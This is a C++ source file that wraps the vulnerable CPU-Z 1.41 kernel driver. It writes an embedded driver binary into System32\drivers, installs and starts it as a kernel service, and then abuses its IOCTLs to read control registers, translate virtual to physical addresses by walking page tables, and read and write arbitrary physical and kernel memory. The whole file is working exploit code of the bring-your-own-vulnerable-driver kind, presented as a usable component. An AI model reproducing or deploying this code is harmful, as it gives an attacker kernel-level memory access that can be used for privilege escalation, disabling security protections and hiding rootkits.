#include "cpuz_driver.hpp"

#include "../../scm.h"
#include "../../sup.h"
#include "cpuz_shellcode.h"

#define CPUZ_FILE_NAME   L"\\SystemRoot\\System32\\drivers\\cpuz141.sys"
#define CPUZ_DEVICE_NAME L"\\Device\\cpuz141"

#define LODWORD(l)       ((DWORD)(((DWORD_PTR)(l)) & 0xffffffff))
#define HIDWORD(l)       ((DWORD)((((DWORD_PTR)(l)) >> 32) & 0xffffffff))

#define IOCTL_READ_CR   0x9C402428
#define IOCTL_READ_MEM  0x9C402420
#define IOCTL_WRITE_MEM 0x9C402430

#pragma pack(push, 1)
struct input_read_mem
{
  std::uint32_t address_high;
  std::uint32_t address_low;
  std::uint32_t length;
  std::uint32_t buffer_high;
  std::uint32_t buffer_low;
};

struct input_write_mem
{
  std::uint32_t address_high;
  std::uint32_t address_low;
  std::uint32_t value;
};

struct output
{
  std::uint32_t operation;
  std::uint32_t buffer_low;
};

#pragma pack(pop)

cpuz_driver::cpuz_driver()
  : deviceHandle_(INVALID_HANDLE_VALUE), serviceHandle_(INVALID_HANDLE_VALUE), unload_(false)
{
}

cpuz_driver::~cpuz_driver()
{
  if(deviceHandle_ != INVALID_HANDLE_VALUE)
    NtClose(deviceHandle_);
  
  if(unload_ && is_loaded())
    unload();
}

cpuz_driver& cpuz_driver::instance()
{
  static cpuz_driver inst;
  return inst;
}

bool cpuz_driver::ensure_loaded()
{
  if(!is_loaded() && !load())
    throw std::runtime_error{ "Driver is not loaded." };

  return true;
}

bool cpuz_driver::is_loaded()
{
  if(!deviceHandle_ || deviceHandle_ == INVALID_HANDLE_VALUE) {
    IO_STATUS_BLOCK io_status;
    NTSTATUS status;

    UNICODE_STRING    device_name = UNICODE_STRING{sizeof(CPUZ_DEVICE_NAME) - sizeof(WCHAR), sizeof(CPUZ_DEVICE_NAME), CPUZ_DEVICE_NAME};
    OBJECT_ATTRIBUTES obj_attr    = OBJECT_ATTRIBUTES{ sizeof(OBJECT_ATTRIBUTES), nullptr, &device_name, 0, nullptr, nullptr };

    status = NtOpenFile(
      &deviceHandle_, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
      &obj_attr, &io_status, 0, OPEN_EXISTING);

    if(!NT_SUCCESS(status)) {
      ULONG i = 10;
      do {
        status = NtOpenFile(
          &deviceHandle_, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
          &obj_attr, &io_status, 0, OPEN_EXISTING);
        Sleep(250);
      } while(!NT_SUCCESS(status) && i--);
    }
  }

  return deviceHandle_ && deviceHandle_ != INVALID_HANDLE_VALUE;
}

bool cpuz_driver::load()
{
  HANDLE service;
  ULONG io;

  if(!SupFileExists(CPUZ_FILE_NAME)) {
    auto file = SupCreateFile(CPUZ_FILE_NAME, FILE_GENERIC_WRITE, 0, FILE_CREATE);

    if(!WriteFile(file, CpuzDriverFile, sizeof(CpuzDriverFile), &io, nullptr)) {
      CloseHandle(file);
      return false;
    }
    CloseHandle(file);
  }

  if(ScmOpenServiceHandle(&service, L"cpuz141", SERVICE_STOP | DELETE)) {
    if(!ScmStopService(service) && GetLastError() != ERROR_SERVICE_NOT_ACTIVE) {
      ScmCloseServiceHandle(service);
      return false;
    }
    if(!ScmDeleteService(service)) {
      ScmCloseServiceHandle(service);
      return false;
    }
    ScmCloseServiceHandle(service);
  }

  if(!ScmCreateService(
    &serviceHandle_,
    L"cpuz141", L"cpuz141",
    CPUZ_FILE_NAME,
    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
    SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL))
    return false;

  if(!ScmStartService(serviceHandle_)) {
    ScmDeleteService(serviceHandle_);
    return false;
  }

  return is_loaded();
}

bool cpuz_driver::unload()
{
  if(deviceHandle_ != INVALID_HANDLE_VALUE)
    NtClose(deviceHandle_);

  if(serviceHandle_ != INVALID_HANDLE_VALUE) {
    if(!ScmStopService(serviceHandle_) && GetLastError() != ERROR_SERVICE_NOT_ACTIVE) {
      ScmCloseServiceHandle(serviceHandle_);
      return false;
    }
    ScmDeleteService(serviceHandle_);
    ScmCloseServiceHandle(serviceHandle_);
  }

  return true;
}

std::uint64_t cpuz_driver::read_cr0()
{
  auto io     = ULONG{ 0 };
  auto cr     = std::uint32_t{ 0 };
  auto value  = std::uint64_t{ 0 };

  if(!DeviceIoControl(deviceHandle_, IOCTL_READ_CR, &cr, sizeof(cr), &value, sizeof(value), &io, nullptr))
    throw std::runtime_error("Failed to read control register");

  return value;
}

std::uint64_t cpuz_driver::read_cr2()
{
  auto io     = ULONG{ 0 };
  auto cr     = std::uint32_t{ 2 };
  auto value  = std::uint64_t{ 0 };

  if(!DeviceIoControl(deviceHandle_, IOCTL_READ_CR, &cr, sizeof(cr), &value, sizeof(value), &io, nullptr))
    throw std::runtime_error("Failed to read control register");

  return value;
}

std::uint64_t cpuz_driver::read_cr3()
{
  auto io     = ULONG{ 0 };
  auto cr     = std::uint32_t{ 3 };
  auto value  = std::uint64_t{ 0 };
  
  if(!DeviceIoControl(deviceHandle_, IOCTL_READ_CR, &cr, sizeof(cr), &value, sizeof(value), &io, nullptr))
    throw std::runtime_error("Failed to read control register");

  return value;
}

std::uint64_t cpuz_driver::translate_linear_address(std::uint64_t directoryTableBase, LPVOID virtualAddress)
{
  auto va = (std::uint64_t)virtualAddress;

  auto PML4         = (USHORT)((va >> 39) & 0x1FF); //<! PML4 Entry Index
  auto DirectoryPtr = (USHORT)((va >> 30) & 0x1FF); //<! Page-Directory-Pointer Table Index
  auto Directory    = (USHORT)((va >> 21) & 0x1FF); //<! Page Directory Table Index
  auto Table        = (USHORT)((va >> 12) & 0x1FF); //<! Page Table Index
  
  // 
  // Read the PML4 Entry. DirectoryTableBase has the base address of the table.
  // It can be read from the CR3 register or from the kernel process object.
  // 
  auto PML4E = read_physical_address<std::uint64_t>(directoryTableBase + PML4 * sizeof(ULONGLONG));

  if(PML4E == 0)
    return 0;

  // 
  // The PML4E that we read is the base address of the next table on the chain,
  // the Page-Directory-Pointer Table.
  // 
  auto PDPTE = read_physical_address<std::uint64_t>((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(ULONGLONG));

  if(PDPTE == 0)
    return 0;

  //Check the PS bit
  if((PDPTE & (1 << 7)) != 0) {
    // If the PDPTE’s PS flag is 1, the PDPTE maps a 1-GByte page. The
    // final physical address is computed as follows:
    // — Bits 51:30 are from the PDPTE.
    // — Bits 29:0 are from the original va address.
    return (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);
  }

  //
  // PS bit was 0. That means that the PDPTE references the next table
  // on the chain, the Page Directory Table. Read it.
  // 
  auto PDE = read_physical_address<std::uint64_t>((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(ULONGLONG));
  
  if(PDE == 0)
    return 0;

  if((PDE & (1 << 7)) != 0) {
    // If the PDE’s PS flag is 1, the PDE maps a 2-MByte page. The
    // final physical address is computed as follows:
    // — Bits 51:21 are from the PDE.
    // — Bits 20:0 are from the original va address.
    return (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
  }

  //
  // PS bit was 0. That means that the PDE references a Page Table.
  // 
  auto PTE = read_physical_address<std::uint64_t>((PDE & 0xFFFFFFFFFF000) + Table * sizeof(ULONGLONG));

  if(PTE == 0)
    return 0;

  //
  // The PTE maps a 4-KByte page. The
  // final physical address is computed as follows:
  // — Bits 51:12 are from the PTE.
  // — Bits 11:0 are from the original va address.
  return (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
}

bool cpuz_driver::read_physical_address(std::uint64_t address, LPVOID buf, size_t len)
{
  auto io  = ULONG{ 0 };
  auto in  = input_read_mem{};
  auto out = output{};

  if(address == 0 || buf == nullptr)
    return false;

  in.address_high = HIDWORD(address);
  in.address_low  = LODWORD(address);
  in.length       = (std::uint32_t)len;
  in.buffer_high  = HIDWORD(buf);
  in.buffer_low   = LODWORD(buf);
    
  return !!DeviceIoControl(deviceHandle_, IOCTL_READ_MEM, &in, sizeof(in), &out, sizeof(out), &io, nullptr);
}

bool cpuz_driver::read_system_address(LPVOID address, LPVOID buf, size_t len)
{
  const auto dirbase = read_cr3();
  const auto phys    = translate_linear_address(dirbase, address);

  if(phys == 0)
    return false;

  return read_physical_address(phys, buf, len);
}

bool cpuz_driver::write_physical_address(std::uint64_t address, LPVOID buf, size_t len)
{
  if(len % 4 != 0 || len == 0)
    throw std::runtime_error{ "The CPU-Z driver can only write lengths that are aligned to 4 bytes (4, 8, 12, 16, etc)" };

  auto io  = ULONG{ 0 };
  auto in  = input_write_mem{};
  auto out = output{};

  if(address == 0 || buf == nullptr)
    return false;

  if(len == 4) {
    in.address_high = HIDWORD(address);
    in.address_low  = LODWORD(address);
    in.value        = *(std::uint32_t*)buf;

    return !!DeviceIoControl(deviceHandle_, IOCTL_WRITE_MEM, &in, sizeof(in), &out, sizeof(out), &io, nullptr);
  } else {
    for(auto i = 0; i < len / 4; i++) {
      in.address_high = HIDWORD(address + 4 * i);
      in.address_low  = LODWORD(address + 4 * i);
      in.value = ((std::uint32_t*)buf)[i];
      if(!DeviceIoControl(deviceHandle_, IOCTL_WRITE_MEM, &in, sizeof(in), &out, sizeof(out), &io, nullptr))
        return false;
    }
    return true;
  }
}

bool cpuz_driver::write_system_address(LPVOID address, LPVOID buf, size_t len)
{
  const auto dirbase = read_cr3();
  const auto phys    = translate_linear_address(dirbase, address);

  if(phys == 0)
    return false;

  return write_physical_address(phys, buf, len);
}
